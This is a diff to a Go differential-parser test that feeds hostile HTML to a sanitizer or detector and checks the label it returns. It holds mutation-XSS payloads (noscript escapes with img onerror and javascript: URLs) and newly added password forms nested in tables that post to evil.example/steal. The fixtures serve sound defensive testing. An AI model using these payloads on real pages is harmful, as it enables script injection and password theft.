@@ -14,6 +14,10 @@ func TestParserDifferential(t *testing.T) {
 		{"noscript속성값탈출", `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>`, "inline-handler"},
 		{"noscript링크탈출", `<noscript><a title="</noscript><a href=javascript:alert(1)>x</a>">y</a></noscript>`, "javascript-url"},
 		{"noscript속style탈출", `<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>`, "inline-handler"},
+		// 표가 폼과 입력을 갈라놓아도 브라우저는 form 요소 포인터로 묶는다 (x/net/html 로 대조)
+		{"표안폼_입력이표밖으로", `<table><form action="https://evil.example/steal"><input type="password" name="pw"></form></table>`, "cross-origin-password-form"},
+		{"표안폼_입력은표뒤", `<table><form action="https://evil.example/steal"></table><input type="password" name="pw">`, "cross-origin-password-form"},
+		{"폼안표안입력", `<form action="https://evil.example/steal"><table><input type="password" name="pw"></table></form>`, "cross-origin-password-form"},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
